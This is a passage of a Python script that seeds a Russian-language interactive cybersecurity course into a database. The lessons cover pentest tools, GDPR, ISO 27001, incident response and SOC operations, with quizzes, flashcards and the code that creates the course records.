                    {"type": "info", "title": "Набор инструментов для пентеста", "markdown": "## Инструменты пентестера\n\n### Kali Linux:\nДистрибутив Linux с предустановленными инструментами ИБ.\n\n### Основные инструменты по категориям:\n\n#### Разведка:\n| Инструмент | Назначение |\n|-----------|------------|\n| nmap | Сканирование портов |\n| Recon-ng | OSINT-фреймворк |\n| Maltego | Визуализация связей |\n\n#### Веб-тестирование:\n| Инструмент | Назначение |\n|-----------|------------|\n| Burp Suite | Перехват и анализ HTTP |\n| OWASP ZAP | Бесплатная альтернатива Burp |\n| SQLmap | Автоматизация SQL injection |\n| Dirb/Gobuster | Перебор директорий |\n\n#### Эксплуатация:\n| Инструмент | Назначение |\n|-----------|------------|\n| Metasploit | Фреймворк эксплуатации |\n| Cobalt Strike | Коммерческий red team |\n\n#### Пароли:\n| Инструмент | Назначение |\n|-----------|------------|\n| John the Ripper | Взлом хешей |\n| Hashcat | GPU взлом хешей |\n| Hydra | Brute force онлайн |\n\n### Burp Suite — must-have:\n```\n1. Настроить прокси в браузере\n2. Перехватывать запросы (Proxy → Intercept)\n3. Модифицировать и повторять (Repeater)\n4. Сканировать автоматически (Scanner)\n5. Анализировать результаты\n```"},
                    {"type": "category-sort", "categories": [{"name": "Разведка", "items": ["nmap", "Recon-ng", "Maltego"]}, {"name": "Веб-тестирование", "items": ["Burp Suite", "SQLmap", "OWASP ZAP"]}, {"name": "Пароли", "items": ["Hashcat", "Hydra", "John the Ripper"]}]},
                    {"type": "quiz", "question": "Какой инструмент является стандартом для перехвата и анализа HTTP-трафика при пентесте?", "options": [{"id": "a", "text": "Wireshark", "correct": False}, {"id": "b", "text": "Burp Suite", "correct": True}, {"id": "c", "text": "Nmap", "correct": False}, {"id": "d", "text": "Metasploit", "correct": False}]},
                    {"type": "type-answer", "question": "Какой инструмент автоматизирует поиск и эксплуатацию SQL injection?", "acceptedAnswers": ["SQLmap", "sqlmap", "Sqlmap"]},
                    {"type": "true-false", "statement": "Kali Linux — это дистрибутив Windows для пентестинга.", "correct": False},
                ],
            },
        ],
    },
    # ===== SECTION 7: Защита и compliance =====
    {
        "title": "Защита и compliance",
        "pos": 6,
        "lessons": [
            {
                "t": "GDPR и защита данных",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "GDPR — защита персональных данных", "markdown": "## GDPR (General Data Protection Regulation)\n\nGDPR — регламент ЕС о защите персональных данных, вступивший в силу в 2018 году.\n\n### Ключевые принципы:\n1. **Законность** — обработка только на законном основании\n2. **Целевое ограничение** — данные только для указанных целей\n3. **Минимизация данных** — только необходимые данные\n4. **Точность** — данные должны быть актуальными\n5. **Ограничение хранения** — не дольше необходимого\n6. **Конфиденциальность** — защита от утечек\n\n### Права субъектов данных:\n- **Право на доступ** — узнать, какие данные хранятся\n- **Право на удаление** — «право быть забытым»\n- **Право на переносимость** — забрать свои данные\n- **Право на возражение** — отказ от обработки\n\n### Штрафы:\n- До **20 млн EUR** или **4% мирового оборота** (что больше)\n- Пример: Meta — штраф 1.2 млрд EUR (2023)\n\n### Для разработчиков:\n- Privacy by Design\n- Data Protection Impact Assessment (DPIA)\n- Назначение DPO (Data Protection Officer)\n- Шифрование и псевдонимизация данных"},
                    {"type": "quiz", "question": "Какой максимальный штраф предусматривает GDPR?", "options": [{"id": "a", "text": "1 млн EUR", "correct": False}, {"id": "b", "text": "10 млн EUR", "correct": False}, {"id": "c", "text": "20 млн EUR или 4% мирового оборота", "correct": True}, {"id": "d", "text": "100 млн EUR", "correct": False}]},
                    {"type": "multi-select", "question": "Какие права есть у субъекта данных по GDPR?", "options": [{"id": "a", "text": "Право на доступ к своим данным", "correct": True}, {"id": "b", "text": "Право на удаление", "correct": True}, {"id": "c", "text": "Право на бесплатный интернет", "correct": False}, {"id": "d", "text": "Право на переносимость данных", "correct": True}]},
                    {"type": "fill-blank", "sentence": "Принцип ___ by Design означает встраивание защиты данных на этапе проектирования системы.", "answer": "Privacy"},
                ],
            },
            {
                "t": "ISO 27001",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "ISO 27001 — стандарт управления ИБ", "markdown": "## ISO 27001\n\nISO/IEC 27001 — международный стандарт управления информационной безопасностью (ISMS).\n\n### Что такое ISMS:\n**Information Security Management System** — система менеджмента ИБ:\n- Политики, процедуры, контроли\n- Управление рисками\n- Непрерывное улучшение\n\n### Структура ISO 27001:\n1. **Контекст организации** — понимание среды\n2. **Лидерство** — поддержка руководства\n3. **Планирование** — оценка рисков\n4. **Поддержка** — ресурсы и компетенции\n5. **Операции** — реализация контролей\n6. **Оценка** — мониторинг и аудит\n7. **Улучшение** — корректирующие действия\n\n### Annex A — 93 контроля в 4 категориях:\n- Организационные (37)\n- Человеческие (8)\n- Физические (14)\n- Технологические (34)\n\n### Цикл PDCA:\n```\nPlan → Do → Check → Act → Plan → ...\n```\n\n### Сертификация:\n- Аудит Stage 1 — проверка документации\n- Аудит Stage 2 — проверка реализации\n- Сертификат на 3 года + ежегодные проверки"},
                    {"type": "drag-order", "items": ["Определить контекст и scope ISMS", "Оценить риски информационной безопасности", "Выбрать и реализовать контроли", "Провести внутренний аудит", "Пройти сертификационный аудит"]},
                    {"type": "matching", "pairs": [{"left": "Plan", "right": "Планирование и оценка рисков"}, {"left": "Do", "right": "Реализация контролей"}, {"left": "Check", "right": "Мониторинг и аудит"}, {"left": "Act", "right": "Корректирующие действия"}]},
                    {"type": "true-false", "statement": "Сертификат ISO 27001 выдаётся навсегда без необходимости повторных аудитов.", "correct": False},
                    {"type": "flashcards", "cards": [{"front": "ISMS", "back": "Information Security Management System — система менеджмента информационной безопасности"}, {"front": "Annex A", "back": "Приложение к ISO 27001 с 93 контролями в 4 категориях"}, {"front": "PDCA", "back": "Plan-Do-Check-Act — цикл непрерывного улучшения"}, {"front": "Сертификация ISO 27001", "back": "2-этапный аудит, сертификат на 3 года"}]},
                ],
            },
            {
                "t": "Инцидент-менеджмент",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "Управление инцидентами ИБ", "markdown": "## Инцидент-менеджмент\n\n**Инцидент ИБ** — событие, которое реально или потенциально угрожает конфиденциальности, целостности или доступности информации.\n\n### Этапы управления инцидентами:\n\n#### 1. Подготовка:\n- Создание Incident Response Team (IRT)\n- Разработка плейбуков (playbooks)\n- Настройка мониторинга и алертов\n\n#### 2. Обнаружение и анализ:\n- SIEM-системы (Splunk, ELK, QRadar)\n- Классификация по severity\n- Определение scope (масштаба)\n\n#### 3. Сдерживание:\n- Изоляция заражённых систем\n- Блокировка подозрительных IP\n- Смена скомпрометированных учётных данных\n\n#### 4. Устранение:\n- Удаление вредоносного ПО\n- Закрытие уязвимости\n- Восстановление из бэкапов\n\n#### 5. Восстановление:\n- Возврат систем в продакшн\n- Мониторинг повторных атак\n\n#### 6. Lessons Learned:\n- Post-mortem отчёт\n- Что пошло не так?\n- Что улучшить?\n\n### Время реагирования:\n```\nCritical: < 15 минут\nHigh: < 1 час\nMedium: < 4 часа\nLow: < 24 часа\n```"},
                    {"type": "drag-order", "items": ["Подготовка (IRT, плейбуки)", "Обнаружение и анализ (SIEM)", "Сдерживание (изоляция)", "Устранение (удаление угрозы)", "Восстановление (возврат в продакшн)", "Lessons Learned (post-mortem)"]},
                    {"type": "quiz", "question": "Что такое SIEM?", "options": [{"id": "a", "text": "Система сбора и анализа событий безопасности", "correct": True}, {"id": "b", "text": "Антивирусное ПО", "correct": False}, {"id": "c", "text": "Тип шифрования", "correct": False}, {"id": "d", "text": "Протокол аутентификации", "correct": False}]},
                    {"type": "multi-select", "question": "Какие действия относятся к этапу сдерживания?", "options": [{"id": "a", "text": "Изоляция заражённых систем", "correct": True}, {"id": "b", "text": "Блокировка подозрительных IP", "correct": True}, {"id": "c", "text": "Написание post-mortem", "correct": False}, {"id": "d", "text": "Смена скомпрометированных паролей", "correct": True}]},
                    {"type": "fill-blank", "sentence": "Отчёт по итогам инцидента, анализирующий что пошло не так, называется ___.", "answer": "post-mortem"},
                ],
            },
            {
                "t": "SOC — центр мониторинга безопасности",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Security Operations Center", "markdown": "## SOC (Security Operations Center)\n\nSOC — команда и инфраструктура для круглосуточного мониторинга безопасности.\n\n### Уровни SOC-аналитиков:\n\n#### Tier 1 — Alert Triage:\n- Мониторинг алертов 24/7\n- Первичная классификация\n- Эскалация на Tier 2\n\n#### Tier 2 — Investigation:\n- Глубокий анализ инцидентов\n- Корреляция событий\n- Определение scope и impact\n\n#### Tier 3 — Threat Hunting:\n- Проактивный поиск угроз\n- Анализ APT (Advanced Persistent Threats)\n- Разработка правил детекции\n\n### Основные инструменты SOC:\n| Категория | Инструменты |\n|-----------|-------------|\n| SIEM | Splunk, QRadar, ELK |\n| EDR | CrowdStrike, Carbon Black |\n| SOAR | Phantom, Demisto |\n| Threat Intel | MISP, VirusTotal |\n| Network | Zeek, Suricata |\n\n### MITRE ATT&CK:\nФреймворк, описывающий тактики и техники атакующих.\n```\nReconnaissance → Initial Access → Execution →\nPersistence → Privilege Escalation → ...\n→ Exfiltration → Impact\n```"},
                    {"type": "category-sort", "categories": [{"name": "Tier 1", "items": ["Мониторинг алертов 24/7", "Первичная классификация"]}, {"name": "Tier 2", "items": ["Глубокий анализ инцидентов", "Корреляция событий"]}, {"name": "Tier 3", "items": ["Проактивный поиск угроз", "Разработка правил детекции"]}]},
                    {"type": "matching", "pairs": [{"left": "SIEM", "right": "Сбор и анализ логов безопасности"}, {"left": "EDR", "right": "Защита и мониторинг конечных точек"}, {"left": "SOAR", "right": "Автоматизация реагирования на инциденты"}, {"left": "MITRE ATT&CK", "right": "Фреймворк тактик и техник атакующих"}]},
                    {"type": "quiz", "question": "Какой уровень SOC-аналитиков занимается проактивным поиском угроз (threat hunting)?", "options": [{"id": "a", "text": "Tier 1", "correct": False}, {"id": "b", "text": "Tier 2", "correct": False}, {"id": "c", "text": "Tier 3", "correct": True}, {"id": "d", "text": "Tier 0", "correct": False}]},
                ],
            },
            {
                "t": "Итоговый тест по кибербезопасности",
                "xp": 40,
                "steps": [
                    {"type": "info", "title": "Финальный обзор", "markdown": "## Итоговый обзор курса\n\nВы изучили все основные области кибербезопасности:\n\n### Что вы теперь знаете:\n1. **InfoSec & CIA триада** — фундамент ИБ\n2. **Сетевая безопасность** — TCP/IP, файрволы, VPN, DDoS\n3. **Криптография** — шифрование, хеширование, TLS, PKI\n4. **Веб-безопасность** — OWASP Top 10, XSS, SQLi, CSRF\n5. **Социальная инженерия** — фишинг, pretexting, awareness\n6. **Пентестинг** — методология, инструменты, отчёты\n7. **Compliance** — GDPR, ISO 27001, SOC\n\n### Следующие шаги:\n- Получите сертификацию (CompTIA Security+)\n- Практикуйтесь на TryHackMe / HackTheBox\n- Участвуйте в CTF-соревнованиях\n- Присоединяйтесь к bug bounty программам\n- Читайте блоги: Krebs on Security, The Hacker News\n\n### Помните:\n> «Безопасность — это процесс, а не продукт.» — Брюс Шнайер"},
                    {"type": "quiz", "question": "Какие три элемента составляют CIA триаду?", "options": [{"id": "a", "text": "Конфиденциальность, целостность, доступность", "correct": True}, {"id": "b", "text": "Шифрование, хеширование, подпись", "correct": False}, {"id": "c", "text": "Фишинг, malware, DDoS", "correct": False}, {"id": "d", "text": "TCP, UDP, ICMP", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "XSS", "right": "Внедрение JavaScript в веб-страницу"}, {"left": "SQL Injection", "right": "Внедрение SQL-кода через ввод"}, {"left": "CSRF", "right": "Подделка запросов от имени жертвы"}, {"left": "DDoS", "right": "Распределённый отказ в обслуживании"}]},
                    {"type": "category-sort", "categories": [{"name": "Криптография", "items": ["AES-256", "RSA", "SHA-256"]}, {"name": "Сетевая безопасность", "items": ["Файрвол", "VPN", "IDS/IPS"]}, {"name": "Веб-безопасность", "items": ["OWASP Top 10", "CSP", "CORS"]}]},
                    {"type": "true-false", "statement": "Пентест без письменного разрешения владельца системы является законным, если найденные уязвимости были ответственно раскрыты.", "correct": False},
                    {"type": "flashcards", "cards": [{"front": "CIA триада", "back": "Конфиденциальность, Целостность, Доступность — три основных принципа ИБ"}, {"front": "OWASP Top 10", "back": "Список 10 самых критичных уязвимостей веб-приложений"}, {"front": "TLS 1.3", "back": "Рекомендуемая версия протокола шифрования соединений"}, {"front": "CVSS", "back": "Common Vulnerability Scoring System — оценка критичности уязвимостей от 0 до 10"}, {"front": "ISO 27001", "back": "Международный стандарт управления информационной безопасностью"}]},
                ],
            },
        ],
    },
]


async def main():
    async with async_session() as db:
        existing = await db.execute(select(Course).where(Course.title == T))
        if existing.scalar_one_or_none():
            print(f"'{T}' already exists — skipping.")
            return
        author = (await db.execute(select(User).limit(1))).scalar_one_or_none()
        if not author:
            print("No users.")
            return
        course = Course(
            title=T,
            slug="cybersecurity-basics-" + uuid.uuid4().hex[:4],
            description=DESC,
            author_id=author.id,
            category="Security",
            difficulty="Intermediate",
            price=0,
            currency="USD",
            status="published",
        )
        db.add(course)
        await db.flush()
        nodes, edges, lc, tl = [], [], 0, 0
        for sd in S:
            sec = CourseSection(
                course_id=course.id, title=sd["title"], position=sd["pos"]
            )
            db.add(sec)
            await db.flush()
            for li, ld in enumerate(sd["lessons"]):
                les = CourseLesson(
                    section_id=sec.id,
                    title=ld["t"],
                    position=li,
                    content_type="interactive",
                    content_markdown="",
                    xp_reward=ld["xp"],
                    steps=ld["steps"],
                )
                db.add(les)
                await db.flush()
                r, c = lc // 5, lc % 5
                x, y = SNAKE_X[c] * CANVAS_W, V_PAD + r * ROW_H
                nodes.append({"id": str(les.id), "x": x, "y": y})
                if lc > 0:
                    edges.append(
                        {
                            "id": f"e-{lc}",
                            "source": nodes[-2]["id"],
                            "target": nodes[-1]["id"],
                        }
                    )
                lc += 1
                tl += 1
        course.roadmap_nodes = nodes
        course.roadmap_edges = edges
        await db.commit()
        print(f"Created '{T}': {len(S)} sections, {tl} lessons.")


if __name__ == "__main__":
    asyncio.run(main())
